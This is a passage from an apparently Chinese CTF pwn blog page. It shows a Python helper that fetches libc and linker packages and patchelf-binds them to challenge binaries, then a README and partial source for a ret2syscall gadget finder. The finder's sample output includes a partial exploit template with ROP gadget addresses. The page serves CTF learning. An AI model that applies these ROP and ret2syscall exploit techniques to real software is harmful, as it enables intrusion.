                pattern = f'libc6_{_re.escape(base)}\\+[^"]*_amd64\\.deb'
                matches = _re.findall(pattern, html)
                if matches:
                    matches.sort(reverse=True)
                    latest = matches[0]
                    latest_ver = latest.replace('libc6_', '').replace('.deb', '')
                    log(f"找到同系列最新版本: {latest_ver}", "ok")
                    log(f"精确版本 {version} 已从镜像移除，下载最新版", "warn")
                    fallback_url = dir_url + latest
                    fallback_file = latest  # latest 已经包含 libc6_ 前缀
                    if download_file(fallback_url, fallback_file):
                        log(f"下载成功: {fallback_file}", "ok")
                        return fallback_file
                    break  # 找到目录就不再搜其他镜像
            except:
                continue

    # 3. 尝试通过 libc.rip 获取 deb 链接
    log("镜像源未找到，尝试 libc.rip ...", "warn")
    try:
        url = "https://libc.rip/api/find"
        query_id = f"libc6_{version.replace('_amd64', '')}_amd64"
        data = json.dumps({"id": query_id}).encode()
        req = urllib.request.Request(url, data=data,
                                    headers={'Content-Type': 'application/json',
                                             'User-Agent': 'Mozilla/5.0'})
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
            results = json.loads(resp.read().decode())
        for r in results:
            # 尝试下载 deb 包 (含链接器)
            libs_url = r.get('libs_url', '')
            if libs_url:
                libs_url = libs_url.replace('//libc6_', '/libc6_')
                log(f"libc.rip 找到: {r.get('id', '')}")
                if download_file(libs_url, deb_file):
                    return deb_file
            # deb 下载失败，尝试下载 .so 文件
            dl_url = r.get('download_url', '')
            if dl_url:
                so_file = f"libc6_{version}.so"
                log(f"deb 下载失败，尝试从 libc.rip 下载 libc.so ...")
                if download_file(dl_url, so_file):
                    log(f"libc.so 下载成功: {so_file}", "ok")
                    log("但 deb 包 (含链接器) 无法下载", "warn")
                    ver_short = version.split('-')[0]  # 如 2.36
                    print()
                    print("  获取链接器的方法:")
                    if not distro or 'debian' in str(distro).lower():
                        print(f"    docker run --rm debian:bookworm cat /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 > ld-{ver_short}.so")
                    else:
                        print(f"    docker run --rm ubuntu:22.04 cat /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 > ld-{ver_short}.so")
                    print()
                    return None
    except Exception as e:
        log(f"libc.rip 查询失败: {e}", "warn")

    # 3. 全部失败
    ver_short = version.split('-')[0]  # 如 2.36
    log(f"版本 {version} 的 deb 包下载失败", "err")
    print()
    print("  获取链接器的方法:")
    print("    1. 使用功能 9 (pwninit) 自动配置环境")
    print("    2. 检查题目附件是否包含 ld-linux-x86-64.so.2 或 ld-*.so")
    print("    3. Docker 提取 (根据发行版选择):")
    if distro and 'ubuntu' in distro.lower():
        print(f"       docker run --rm ubuntu:22.04 cat /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 > ld-{ver_short}.so")
    else:
        print(f"       docker run --rm debian:bookworm cat /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 > ld-{ver_short}.so")
    print()
    return None

def extract_deb(deb_file, extract_dir):
    """提取 deb 包，兼容 Linux/WSL/Windows"""
    log(f"提取到: {extract_dir}/")
    os.makedirs(extract_dir, exist_ok=True)

    # 优先用 dpkg
    ok, _, _ = run_cmd(f"dpkg -x {deb_file} {extract_dir}")
    if ok:
        return True

    # dpkg 不可用，用 ar + tar 手动提取
    log("dpkg 不可用，尝试 ar + tar 提取...", "warn")
    tmp_dir = f"{extract_dir}_tmp"
    os.makedirs(tmp_dir, exist_ok=True)

    ok, _, _ = run_cmd(f"ar x {deb_file} --output={tmp_dir}")
    if not ok:
        # Windows 没有 ar，尝试用 Python 的 arpy
        try:
            import arpy
            a = arpy.Archive(deb_file)
            a.read_all_headers()
            for name, header in a.archived_files.items():
                out_path = os.path.join(tmp_dir, name.decode() if isinstance(name, bytes) else name)
                os.makedirs(os.path.dirname(out_path), exist_ok=True)
                with open(out_path, 'wb') as f:
                    f.write(header.read())
        except ImportError:
            log("需要 arpy 库来解包 deb (pip install arpy)", "err")
            try:
                run_cmd(f"{sys.executable} -m pip install arpy -q")
                import arpy
                a = arpy.Archive(deb_file)
                a.read_all_headers()
                for name, header in a.archived_files.items():
                    out_path = os.path.join(tmp_dir, name.decode() if isinstance(name, bytes) else name)
                    os.makedirs(os.path.dirname(out_path), exist_ok=True)
                    with open(out_path, 'wb') as f:
                        f.write(header.read())
            except:
                log("安装 arpy 失败，请在 WSL 中运行此工具", "err")
                return False

    # 找 data.tar.* 并解压
    data_tar = None
    for f in os.listdir(tmp_dir):
        if f.startswith('data.'):
            data_tar = os.path.join(tmp_dir, f)
            break

    if data_tar:
        import tarfile
        with tarfile.open(data_tar) as tf:
            tf.extractall(extract_dir)
        shutil.rmtree(tmp_dir, ignore_errors=True)
        return True

    log("提取失败", "err")
    return False

def find_patchelf():
    """查找 patchelf 可执行文件路径"""
    # 1. 先用 shutil.which 找
    p = shutil.which('patchelf')
    if p:
        return p
    # 2. 常见路径
    for path in ['/usr/bin/patchelf', '/usr/local/bin/patchelf',
                 '/usr/sbin/patchelf', '/usr/local/sbin/patchelf']:
        if os.path.isfile(path) and os.access(path, os.X_OK):
            return path
    # 3. 用 find 搜
    ok, out, _ = run_cmd("find /usr -name patchelf -type f 2>/dev/null | head -1")
    if ok and out.strip():
        return out.strip()
    return None

def do_patchelf(binary, ld_path, lib_dir):
    """patchelf 绑定（兼容 WSL NTFS 文件系统）"""
    ld_abs = os.path.abspath(ld_path)
    lib_abs = os.path.abspath(lib_dir)
    backup = f"{binary}.bak"

    shutil.copy2(binary, backup)
    log(f"备份: {backup}")

    patchelf = find_patchelf()
    if not patchelf:
        log("patchelf 未安装，尝试安装...", "warn")
        ok, _, _ = run_cmd("sudo apt install -y patchelf")
        if ok:
            patchelf = find_patchelf()

    if not patchelf:
        log("patchelf 未找到，请手动安装: sudo apt install patchelf", "err")
        shutil.copy2(backup, binary)
        return False

    log(f"patchelf 路径: {patchelf}")

    # WSL 在 /mnt/ (NTFS) 上 patchelf 会报 Text file busy
    # 解决: 先复制到 /tmp 操作，再拷回来
    tmp_binary = f"/tmp/_patchelf_{os.path.basename(binary)}"
    shutil.copy2(binary, tmp_binary)

    import shlex
    cmd = f"{shlex.quote(patchelf)} --set-interpreter {shlex.quote(ld_abs)} --set-rpath {shlex.quote(lib_abs)} {shlex.quote(tmp_binary)}"
    ok, stdout, stderr = run_cmd(cmd)

    if ok:
        os.remove(binary)
        shutil.copy2(tmp_binary, binary)
        os.remove(tmp_binary)
        log("patchelf 完成", "ok")
        return True
    else:
        log(f"patchelf 执行失败: {stderr.strip()}", "err")
        os.remove(tmp_binary)
        return False

def show_usage(version, libc_file, ld_path=None):
    """显示使用方法"""
    print()
    print("=" * 55)
    print("  绑定完成！已使用的文件：")
    print("=" * 55)
    if ld_path:
        print(f"    链接器: {ld_path}")
    print(f"    libc:   {libc_file}")
    print()
    print("  在你的 exploit 脚本里这样用：")
    print("-" * 55)
    print(f"""
    from pwn import *

    context(os='linux', arch='amd64')
    elf = ELF('./your_binary')
    libc = ELF('./{libc_file}')
    r = process('./your_binary')      # 本地测试 (需 patchelf)
    # r = remote('challenge.xxx', xx) # 打远程
    """)

# ============================================================
#  pwninit 集成
# ============================================================

def find_pwninit():
    """查找 pwninit (Rust 版) 可执行文件"""
    # 1. 当前目录
    if os.path.isfile('pwninit') and os.access('pwninit', os.X_OK):
        if _is_rust_pwninit('./pwninit'):
            return './pwninit'
    # 2. ~/.local/bin
    home_pwninit = os.path.expanduser('~/.local/bin/pwninit')
    if os.path.isfile(home_pwninit) and os.access(home_pwninit, os.X_OK):
        if _is_rust_pwninit(home_pwninit):
            return home_pwninit
    # 3. PATH 中查找
    p = shutil.which('pwninit')
    if p and _is_rust_pwninit(p):
        return p
    return None

def _is_rust_pwninit(path):
    """检查 pwninit 是否是 Rust 编译的 ELF 版本（排除 Python 版）"""
    try:
        with open(path, 'rb') as f:
            magic = f.read(4)
            return magic == b'\x7fELF'  # Rust 版是 ELF，Python 版是脚本
    except:
        return False

def install_pwninit():
    """下载安装 pwninit (Rust 版)"""
    import stat
    url = "https://github.com/io12/pwninit/releases/latest/download/pwninit"
    target = os.path.expanduser('~/.local/bin/pwninit')
    os.makedirs(os.path.dirname(target), exist_ok=True)

    # 如果有旧的 Python 版 pwninit，先卸载
    ok, _, _ = run_cmd(f'{sys.executable} -m pip show pwninit 2>/dev/null')
    if ok:
        log("检测到旧的 Python 版 pwninit，正在卸载...", "warn")
        run_cmd(f'{sys.executable} -m pip uninstall pwninit -y 2>/dev/null')

    log(f"下载 pwninit ...")
    log(f"URL: {url}")
    if download_file(url, target):
        os.chmod(target, os.stat(target).st_mode | stat.S_IEXEC)
        log(f"安装成功: {target}", "ok")
        return target
    else:
        # 备用: 下载到当前目录
        log("安装到 ~/.local/bin 失败，尝试当前目录...", "warn")
        if download_file(url, './pwninit'):
            os.chmod('./pwninit', os.stat('./pwninit').st_mode | stat.S_IEXEC)
            log("安装成功: ./pwninit", "ok")
            return './pwninit'
    return None

def run_pwninit():
    """使用 pwninit 一键配置环境"""
    # 检查/安装 pwninit
    pwninit = find_pwninit()
    if not pwninit:
        log("pwninit 未安装", "warn")
        print()
        print("  pwninit 可以自动:")
        print("    - 检测 libc 版本")
        print("    - 下载匹配的 ld-linux 链接器")
        print("    - 自动 patchelf 生成 _patched 文件")
        print("    - 生成 exploit 模板")
        print()
        confirm = input("[+] 是否自动下载安装 pwninit? (y/n): ").strip().lower()
        if confirm == 'y':
            pwninit = install_pwninit()
            if not pwninit:
                log("安装失败，请手动安装:", "err")
                print("  cargo install pwninit")
                print("  或: https://github.com/io12/pwninit/releases")
                return
        else:
            return

    # 扫描目录中的文件
    binaries = find_elf_files()
    libc_files = [f for f in os.listdir('.') if os.path.isfile(f) and
                  'libc' in f.lower() and (f.endswith('.so') or '.so.' in f)]

    if not binaries:
        log("未找到 ELF 可执行文件", "warn")
        return

    if not libc_files:
        log("未找到 libc 文件", "warn")
        print("  请先通过 libc.rip 或其他方式获取 libc.so")
        return

    # 选择二进制文件
    if len(binaries) == 1:
        binary = binaries[0]
    else:
        log("检测到以下二进制文件:")
        for i, b in enumerate(binaries):
            print(f"  [{i+1}] {b}")
        idx_s = input("[+] 选择编号: ").strip()
        try:
            binary = binaries[int(idx_s) - 1]
        except:
            log("无效选择", "err")
            return

    # 选择 libc 文件
    if len(libc_files) == 1:
        libc_file = libc_files[0]
    else:
        log("检测到以下 libc 文件:")
        for i, f in enumerate(libc_files):
            ver, _ = identify_version_from_file(f)
            ver_str = f" (v{ver})" if ver else ""
            print(f"  [{i+1}] {f}{ver_str}")
        idx_s = input("[+] 选择编号: ").strip()
        try:
            libc_file = libc_files[int(idx_s) - 1]
        except:
            log("无效选择", "err")
            return

    # 在临时目录运行 pwninit (避免 IDA 文件权限问题)
    import tempfile
    tmp_dir = tempfile.mkdtemp(prefix='pwninit_')
    bin_name = os.path.basename(binary)
    libc_name = os.path.basename(libc_file)

    shutil.copy2(binary, os.path.join(tmp_dir, bin_name))
    shutil.copy2(libc_file, os.path.join(tmp_dir, libc_name))
    # 如果已有 ld 也复制进去 (pwninit 会优先使用)
    for f in os.listdir('.'):
        if os.path.isfile(f) and ('ld-linux' in f or f.startswith('ld-')) and (f.endswith('.so') or '.so.' in f):
            shutil.copy2(f, os.path.join(tmp_dir, f))

    log(f"运行 pwninit ...")
    old_cwd = os.getcwd()
    os.chdir(tmp_dir)
    ok, stdout, stderr = run_cmd(f"{pwninit} --bin {bin_name} --libc {libc_name} --no-template")
    os.chdir(old_cwd)
    print(stdout)
    if stderr:
        print(stderr)

    if ok:
        # 找到 pwninit 下载/使用的 ld
        ld_found = None
        for f in os.listdir(tmp_dir):
            if ('ld-linux' in f or f.startswith('ld-')) and (f.endswith('.so') or '.so.' in f):
                ld_found = f
                # 复制 ld 到当前目录
                if not os.path.exists(f):
                    shutil.copy2(os.path.join(tmp_dir, f), f)
                break

        # 复制 patched binary 回来
        patched_src = os.path.join(tmp_dir, f"{bin_name}_patched")
        patched_dst = f"{binary}_patched"
        if os.path.exists(patched_src):
            shutil.copy2(patched_src, patched_dst)

            # 检查 interpreter 是否有效
            ok_elf, interp_out, _ = run_cmd(f"readelf -l {patched_dst} 2>/dev/null | grep interpreter")
            if ok_elf and interp_out.strip():
                interp_path = interp_out.strip().split(':')[-1].strip().rstrip(']')
                if not os.path.exists(interp_path):
                    # interpreter 路径不存在，需要修复
                    if not ld_found:
                        # pwninit 没下载 ld，手动下载
                        log("pwninit 未下载链接器，正在自动下载...", "warn")
                        libc_ver, libc_distro = identify_version_from_file(libc_file)
                        if libc_ver:
                            deb = download_deb(libc_ver, libc_distro)
                            if deb:
                                ext = f"_ld_extract_{libc_ver}"
                                if extract_deb(deb, ext):
                                    ld_src = f"{ext}/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2"
                                    if os.path.exists(ld_src):
                                        ld_major = '.'.join(libc_ver.split('.')[:2])
                                        ld_found = f"ld-{ld_major}.so"
                                        shutil.copy2(ld_src, ld_found)
                                        shutil.rmtree(ext, ignore_errors=True)
                                os.remove(deb)
                    if ld_found:
                        log("修复 interpreter...", "warn")
                        ld_abs = os.path.abspath(ld_found)
                        lib_abs = os.path.abspath('.')
                        patchelf = find_patchelf()
                        if patchelf:
                            run_cmd(f"{patchelf} --set-interpreter {ld_abs} --set-rpath {lib_abs} {patched_dst}")

            log(f"生成: {patched_dst}", "ok")
            if ld_found:
                log(f"链接器: {ld_found}", "ok")
            print()
            print("  现在可以直接运行:")
            print(f"    ./{os.path.basename(patched_dst)}")
        else:
            log("pwninit 未生成 patched binary", "err")
    else:
        log("pwninit 执行失败", "err")

    shutil.rmtree(tmp_dir, ignore_errors=True)

# ============================================================
#  主菜单
# ============================================================

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def main():
    first = True
    while True:
        if not first:
            input("\n按回车返回主菜单...")
        first = False
        clear_screen()
        print(BANNER)
        print("  ┌───────────────────────────────────────────────────────┐")
        print("  │  1. 下载 libc + 链接器                                │")
        print("  │  2. patchelf 绑定二进制                               │")
        print("  │  3. 一键完成 (下载 + 绑定)                            │")
        print("  │  4. 检测当前目录 libc 版本                            │")
        print("  │  5. 查看二进制使用的链接器 (readelf)                  │")
        print("  │  6. 查看 libc 详细版本 (strings)                      │")
        print("  │  7. 根据已有文件下载匹配的链接器/libc                 │")
        print("  │  8. libc.rip 在线查询 (泄露地址/偏移查版本)           │")
        print("  │  9. pwninit 一键配置 (自动下载ld+patchelf)            │")
        print("  │  0. 退出                                              │")
        print("  └───────────────────────────────────────────────────────┘")

        choice = input("\n[+] 选择功能: ").strip()

        if choice == '0':
            break

        elif choice == '4':
            ver, distro = detect_libc_version()
            if ver:
                log(f"检测到 libc 版本: {ver}", "ok")
                if distro:
                    log(f"发行版: {distro}", "info")
            else:
                log("未检测到 libc 文件", "warn")
            continue

        elif choice == '5':
            detect_interpreter()
            continue

        elif choice == '6':
            detect_libc_strings()
            continue

        elif choice == '7':
            fetch_matching_component()
            continue

        elif choice == '8':
            query_libc_rip()
            continue

        elif choice == '9':
            run_pwninit()
            continue

        elif choice in ('1', '3'):
            version = input("[+] libc 版本号 (如 2.35-0ubuntu3.13_amd64): ").strip()
            if not version:
                log("版本号不能为空", "err")
                continue

            # 兼容输入完整文件名 libc6_xxx.deb
            if version.startswith("libc6_"):
                version = version[6:]
            if version.endswith(".deb"):
                version = version[:-4]

            extract_dir = f"libc6_{version}"
            libc_file = f"libc6_{version}.so"
            ld_path = f"{extract_dir}/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2"
            libc_path = f"{extract_dir}/lib/x86_64-linux-gnu/libc.so.6"

            if os.path.exists(extract_dir) and os.path.exists(ld_path):
                log(f"目录已存在，跳过下载: {extract_dir}/")
            else:
                deb_file = download_deb(version)
                if not deb_file:
                    continue
                if not extract_deb(deb_file, extract_dir):
                    continue
                if os.path.exists(deb_file):
                    os.remove(deb_file)

            if not os.path.exists(ld_path):
                log(f"找不到链接器: {ld_path}", "err")
                continue

            log(f"链接器: {ld_path}", "ok")
            log(f"libc:   {libc_path}", "ok")

            if not os.path.exists(libc_file):
                shutil.copy2(libc_path, libc_file)
                log(f"已复制到: {libc_file}", "ok")
            else:
                log(f"已存在: {libc_file}")

            if choice == '1':
                show_usage(version, libc_file, ld_path)
                continue

        elif choice == '2':
            pass  # 下面继续处理 patchelf

        else:
            log("无效选项", "warn")
            continue

        # patchelf 部分
        if choice in ('2', '3'):
            if choice == '2':
                # 扫描所有 glibc 相关文件
                glibc_files = scan_glibc_files()
                if not glibc_files:
                    log("未找到 libc 或链接器文件，请先用功能 1 下载", "warn")
                    continue

                # 分类: libc 和 ld
                libc_list = [(f, t, v, d) for f, t, v, d in glibc_files if t == 'libc']
                ld_list = [(f, t, v, d) for f, t, v, d in glibc_files if t == 'ld']

                # 让用户选择 libc
                if not libc_list:
                    log("未找到 libc 文件", "warn")
                    continue

                log("检测到以下 libc:")
                for i, (f, _, v, d) in enumerate(libc_list):
                    ver_str = f" (v{v})" if v else ""
                    distro_str = f" [{d}]" if d else ""
                    print(f"  [{i+1}] {f}{ver_str}{distro_str}")

                if len(libc_list) == 1:
                    libc_path = libc_list[0][0]
                    confirm = input(f"[+] 使用 {libc_path}? (y/n): ").strip().lower()
                    if confirm != 'y':
                        continue
                else:
                    idx_s = input("[+] 选择编号: ").strip()
                    try:
                        libc_path = libc_list[int(idx_s) - 1][0]
                    except:
                        log("无效选择", "err")
                        continue

                libc_file = libc_path
                libc_ver, libc_distro = identify_version_from_file(libc_file)
                libc_major = '.'.join(libc_ver.split('.')[:2]) if libc_ver else None

                # 收集所有匹配的链接器
                ld_path = None
                lib_dir = None
                extract_dir = None
                matched_lds = []  # [(路径, 来源描述)]

                # 优先从 ld 文件列表找（用户自己提供的文件，版本更准确）
                for f, t, v, d in ld_list:
                    desc = f"[文件] {f}"
                    if v:
                        desc += f" (v{v})"
                        ld_major = '.'.join(v.split('.')[:2])
                        if libc_major and ld_major == libc_major:
                            matched_lds.append((f, desc))
                    else:
                        # 版本检测失败，用文件名中的版本号兜底
                        import re
                        fname_ver = re.search(r'(\d+\.\d+)', f)
                        if fname_ver and libc_major and fname_ver.group(1) == libc_major:
                            matched_lds.append((f, desc))

                # 再从 libc6_* 目录找（可能包含降级版本，优先级低）
                if libc_major:
                    for d in sorted(os.listdir('.')):
                        if d.startswith('libc6_') and os.path.isdir(d):
                            dir_major = '.'.join(d.replace('libc6_', '').split('.')[:2])
                            if dir_major == libc_major:
                                ld = os.path.join(d, "lib/x86_64-linux-gnu/ld-linux-x86-64.so.2")
                                if os.path.exists(ld):
                                    # 用 strings 检测链接器实际版本
                                    _, out, _ = run_cmd(f'strings {ld} 2>/dev/null | grep "release version" | head -1')
                                    ld_ver_str = out.strip() if out else ""
                                    # 对比 libc 版本
                                    _, out2, _ = run_cmd(f'strings {libc_file} 2>/dev/null | grep "GNU C Library" | head -1')
                                    libc_ver_str = out2.strip() if out2 else ""
                                    if ld_ver_str and libc_ver_str and ld_ver_str != libc_ver_str:
                                        matched_lds.append((ld, f"[目录] {ld} ⚠ 版本不同!"))
                                        matched_lds[-1] = (ld, f"[目录] {ld} ⚠ ld={ld_ver_str.split(')')[0].split('(')[-1].strip()}, libc={libc_ver_str.split(')')[0].split('(')[-1].strip()}")
                                    else:
                                        matched_lds.append((ld, f"[目录] {ld}"))

                # 列出所有可用的 ld 文件（当前目录 + libc6_* 目录）
                # 当前目录的 ld 文件
                for f in os.listdir('.'):
                    if os.path.isfile(f) and ('ld-linux' in f or f.startswith('ld-') or 'ld.so' in f) \
                       and (f.endswith('.so') or '.so.' in f):
                        if f not in [m[0] for m in matched_lds]:
                            _, out, _ = run_cmd(f'strings {f} 2>/dev/null | grep "release version" | head -1')
                            ver_hint = out.strip()[:60] if out else ""
                            matched_lds.append((f, f"[文件] {f} {ver_hint}"))
                # libc6_* 目录里的 ld 文件
                for d in sorted(os.listdir('.')):
                    if d.startswith('libc6_') and os.path.isdir(d):
                        ld = os.path.join(d, "lib/x86_64-linux-gnu/ld-linux-x86-64.so.2")
                        if os.path.exists(ld) and ld not in [m[0] for m in matched_lds]:
                            _, out, _ = run_cmd(f'strings {ld} 2>/dev/null | grep "release version" | head -1')
                            ver_hint = out.strip()[:60] if out else ""
                            matched_lds.append((ld, f"[目录] {ld} {ver_hint}"))

                if matched_lds:
                    log(f"可用的链接器:")
                    for i, (_, desc) in enumerate(matched_lds):
                        print(f"  [{i+1}] {desc}")
                    idx_s = input("[+] 选择编号: ").strip()
                    try:
                        ld_path = matched_lds[int(idx_s) - 1][0]
                        lib_dir = os.path.dirname(ld_path) if os.path.dirname(ld_path) else '.'
                    except:
                        log("无效选择", "err")
                        continue
                    if 'libc6_' in ld_path:
                        extract_dir = ld_path.split('/lib/')[0] if '/lib/' in ld_path else None

                if not ld_path:
                    # 没找到匹配的链接器，展示详细信息并尝试下载
                    log(f"未找到匹配的链接器，正在检测 {libc_file} 的版本...")
                    print()
                    print(f"  文件: {libc_file}")
                    ok, out, _ = run_cmd(f'strings {libc_file} 2>/dev/null | grep "stable release" | head -1')
                    if ok and out.strip():
                        print(f"  版本: {out.strip()}")
                    if libc_distro:
                        print(f"  发行版: {libc_distro}")
                    print()

                    if libc_ver:
                        if libc_ver.startswith("libc6_"):
                            libc_ver = libc_ver[6:]
                        if libc_ver.endswith(".deb"):
                            libc_ver = libc_ver[:-4]
                        log(f"识别版本: {libc_ver}")
                        confirm = input(f"[+] 自动下载 libc6_{libc_ver}.deb 提取链接器? (y/n): ").strip().lower()
                        if confirm == 'y':
                            extract_dir = f"libc6_{libc_ver}"
                            deb_file = download_deb(libc_ver, libc_distro)
                            if deb_file and extract_deb(deb_file, extract_dir):
                                os.remove(deb_file)
                                ld_path = f"{extract_dir}/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2"
                                lib_dir = os.path.dirname(ld_path)
                                if os.path.exists(ld_path):
                                    log(f"链接器下载成功: {ld_path}", "ok")
                                else:
                                    log("提取失败，未找到 ld-linux", "err")
                                    continue
                            else:
                                log("下载失败", "err")
                                continue
                        else:
                            continue
                    else:
                        log(f"无法识别 {libc_file} 的版本，请手动输入", "err")
                        manual = input("[+] 版本号 (如 2.35-0ubuntu3.13_amd64): ").strip()
                        if manual:
                            extract_dir = f"libc6_{manual}"
                            deb_file = download_deb(manual)
                            if deb_file and extract_deb(deb_file, extract_dir):
                                os.remove(deb_file)
                                ld_path = f"{extract_dir}/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2"
                                lib_dir = os.path.dirname(ld_path)
                        if not ld_path:
                            continue
            else:
                lib_dir = f"{extract_dir}/lib/x86_64-linux-gnu/"

            binaries = find_elf_files()
            if not binaries:
                log("未检测到 ELF 可执行文件", "warn")
                continue

            if len(binaries) == 1:
                binary = binaries[0]
                confirm = input(f"[+] 检测到 {binary}，绑定它? (y/n): ").strip().lower()
                if confirm != 'y':
                    continue
            else:
                log("检测到以下二进制文件:")
                for i, b in enumerate(binaries):
                    print(f"  [{i+1}] {b}")
                idx_s = input("[+] 选择编号: ").strip()
                try:
                    binary = binaries[int(idx_s) - 1]
                except:
                    log("无效选择", "err")
                    continue

            if not os.path.exists(binary):
                log(f"文件不存在: {binary}", "err")
                continue

            confirm = input(f"[+] patchelf 绑定 {binary} ? (y/n): ").strip().lower()
            if confirm == 'y':
                ok = do_patchelf(binary, ld_path, lib_dir)
                if ok:
                    if choice == '3':
                        show_usage(version, libc_file, ld_path)
                    else:
                        ver_display = extract_dir.replace("libc6_", "") if extract_dir else libc_file
                        show_usage(ver_display, libc_file, ld_path)

        print()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[*] 已退出")
    except Exception as e:
        print(f"\n[-] 错误: {e}")
        import traceback
        traceback.print_exc()

```


---

## syscall地址查询-PWN_SYSCALL_TOOL v1.0

ret2syscall 快速搜索工具，支持 32-bit / 64-bit ELF 二进制。

交互式菜单一键完成 gadget 搜索、全局变量查找、`/bin/sh` 检测、exploit 模板生成。

![image-20260615111136837](https://img2024.cnblogs.com/blog/3726946/202606/3726946-20260615111245241-412258379.png)

---

### 依赖

```
pip install pwntools pyelftools ROPgadget
```

| 依赖         | 用途               |
| ------------ | ------------------ |
| `pwntools`   | ELF 解析、架构检测 |
| `pyelftools` | 段/节信息读取      |
| `ROPgadget`  | gadget 地址搜索    |

### 使用方法

```bash
python syscall_tool.py
```

启动后进入交互式菜单：

```
 ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗
 ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
 ███████║███████║██║     █████╔╝ █████╗  ██║  ██║
 ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██║  ██║
 ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██████╔╝
 ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝
                               PWN_SYSCALL_TOOL v1.0

    ┌─ 选择目标 ───────────────────────────────────┐
    │                                             │
    │  [1] 扫描当前目录                             │
    │  [2] 手动输入路径                             │
    │  [3] 扫描指定目录                             │
    │  [0] 退出                                    │
    │                                             │
    └─────────────────────────────────────────────┘
```

### 功能说明

#### 1. 扫描当前目录

自动扫描当前目录下所有 ELF 可执行文件，显示架构 (`i386` / `x64`) 和文件大小，输入序号即可分析。

#### 2. 手动输入路径

直接输入二进制文件的路径，支持相对路径和绝对路径。

#### 3. 扫描指定目录

输入目录路径，扫描该目录下所有 ELF 文件。

#### 4. 自动分析

选中文件后自动执行以下分析：

##### 4.1 架构检测

读取 ELF header 自动判断 `i386` (32-bit) 或 `amd64` (64-bit)，后续搜索自动适配。

##### 4.2 Gadget 搜索

调用 ROPgadget 搜索常用 syscall 相关 gadget：

**32-bit (i386)：**

| Gadget                    | 用途                |
| ------------------------- | ------------------- |
| `pop eax ; ret`           | syscall 号          |
| `pop ebx ; ret`           | arg1                |
| `pop ecx ; ret`           | arg2                |
| `pop edx ; ret`           | arg3                |
| `pop ecx ; pop ebx ; ret` | 一次设两个参数      |
| `mov [edx], eax ; ret`    | 写内存 (构造字符串) |
| `int 0x80`                | 触发系统调用        |

**64-bit (amd64)：**

| Gadget                 | 用途         |
| ---------------------- | ------------ |
| `pop rax ; ret`        | syscall 号   |
| `pop rdi ; ret`        | arg1         |
| `pop rsi ; ret`        | arg2         |
| `pop rdx ; ret`        | arg3         |
| `pop rcx / r8 / r9`    | arg4-6       |
| `mov [rdx], rax ; ret` | 写内存       |
| `syscall`              | 触发系统调用 |

##### 4.3 可写段查找

列出 `.bss`、`.data`、`.got`、`.got.plt` 段的地址和大小，推荐可用的 `data_buf` 地址。

---

##### 4.4 /bin/sh 搜索

在二进制中搜索 `/bin/sh` 和 `/bin/bash` 字符串：

- 找到 → 输出文件偏移和虚拟地址
- 未找到 → 提示需要手动写入，并给出方法

---

##### 4.5 Exploit 模板

直接输出可复制的 exploit 代码，包含：

- 所有找到的 gadget 地址变量
- `data_buf` 和 `binsh` 地址
- `execve` 调用示例代码
- 无 `/bin/sh` 时的手动写入代码

### 示例输出

```asm
    ┌────────────────────────────────────────────────┐
    │  目标: ret2syscall32                           │
    │  架构: i386 (32-bit)                           │
    └────────────────────────────────────────────────┘

  [*] 搜索 syscall gadget ...

    [+] pop eax                                  0x080491a6  (pop eax ; ret)
    [+] pop ebx                                  0x08049022  (pop ebx ; ret)
    [+] pop ecx; pop ebx                         0x080491b0  (pop ecx ; pop ebx ; ret)
    [+] pop edx                                  0x080491b6  (pop edx ; ret)
    [+] mov [edx], eax                           0x080491bb  (mov dword ptr [edx], eax ; ret)
    [+] int 0x80                                 0x080491c1  (int 0x80)

  [*] 可写段 (全局变量) ...

    [+] .bss           addr=0x804b360  size=0x140  end=0x804b4a0

    >>> 推荐 data_buf: 0x804b360

  [*] 搜索 /bin/sh ...

    [-] 并没有纯净的 /bin/sh
        需要 mov [edx], eax 手动写入 "/bin" + "/sh\0"

    ┌─ exploit.py 模板 (i386) ─────────────────────┐

    from pwn import *
    context(os='linux', arch='i386')

    pop_eax          = 0x080491a6   # pop eax ; ret
    pop_ecx_ebx      = 0x080491b0   # pop ecx ; pop ebx ; ret
    pop_edx          = 0x080491b6   # pop edx ; ret
    mov_edx_eax      = 0x080491bb   # mov [edx], eax ; ret
    int_0x80         = 0x080491c1   # int 0x80
    data_buf         = 0x804b360    # .bss 可写缓冲区
```

### 文件结构

```
.
├── syscall_tool.py      # 主工具脚本
├── exploit.py           # exploit 示例
├── decode.py            # exploit 备份
├── main.c               # 题目源码
├── ret2syscall32        # 目标二进制
├── WP.md                # 解题 writeup
└── README.md            # 本文件
```

### 脚本源码

```python
#!/usr/bin/env python3
"""
PWN_SYSCALL_TOOL v1.0 - ret2syscall 快速搜索工具 (32-bit / 64-bit 通用)
交互式菜单选择二进制文件, 自动完成:
  1. 架构检测 (i386 / amd64)
  2. syscall gadget 搜索
  3. 可写全局变量查找
  4. /bin/sh 字符串搜索
  5. exploit 模板输出
"""

import sys
import subprocess
import re
import os
import stat
import glob as globmod

# Windows 终端 UTF-8 支持
if sys.platform == 'win32':
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    sys.stderr.reconfigure(encoding='utf-8', errors='replace')
    # Windows 10+ 启用 ANSI 转义序列
    os.system('')

# ── ANSI 颜色 ──
C_RESET   = '\033[0m'
C_GREEN   = '\033[32m'      # 地址
C_YELLOW  = '\033[33m'      # gadget 指令
C_CYAN    = '\033[36m'      # 段名 / 标题
C_RED     = '\033[31m'      # 未找到
C_MAGENTA = '\033[35m'      # 推荐地址
